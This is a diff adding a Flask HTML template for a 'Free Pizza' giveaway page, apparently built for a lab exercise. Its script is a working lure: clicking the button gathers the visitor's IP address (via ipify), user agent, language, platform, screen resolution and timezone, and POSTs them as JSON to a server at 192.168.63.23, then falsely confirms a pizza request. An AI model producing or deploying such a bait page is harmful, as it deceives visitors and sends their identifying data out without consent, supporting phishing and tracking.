@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Pizza</title>
+    <!-- Use Flask's url_for to correctly load the CSS file -->
+    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
+</head>
+<body>
+    <div class="container">
+        <h1>Claim Your Free Pizza!</h1>
+        <button id="pizzaButton">Get Free Pizza</button>
+    </div>
+
+    <script>
+        // Function to get user's IP address via an external service (ipify)
+        function getUserIP() {
+            return fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => data.ip)
+                .catch(error => {
+                    console.error('Error fetching IP address:', error);
+                    return 'Unknown';
+                });
+        }
+
+        // Function to collect user info
+        async function collectUserInfo() {
+            // Get the user's IP address
+            const ipAddress = await getUserIP();
+
+            // Get browser and system information using Navigator API
+            const browserInfo = {
+                ip: ipAddress,
+                browser: navigator.userAgent, // User agent string gives browser info
+                language: navigator.language, // Language set in the browser
+                platform: navigator.platform, // Platform (OS info)
+                screenResolution: `${window.screen.width}x${window.screen.height}`, // Screen resolution
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone // Time zone
+            };
+
+            return browserInfo;
+        }
+
+        // Add an event listener to the button
+        document.getElementById('pizzaButton').addEventListener('click', async function() {
+            // Collect the user's info
+            const userInfo = await collectUserInfo();
+
+            // Log the information (you can also display this or send it to the server)
+            console.log('User Info:', userInfo);
+
+            // Create an XMLHttpRequest to send the data to the server
+            const xhr = new XMLHttpRequest();
+            xhr.open("POST", "http://192.168.63.23/receive_data", true);  // Send the POST request to your virtual server
+
+            xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4 && xhr.status === 200) {
+                    alert("Your pizza request has been sent!");
+                }
+            };
+
+            // Send the user's info as JSON
+            xhr.send(JSON.stringify(userInfo));
+        });
+    </script>
+</body>
+</html>
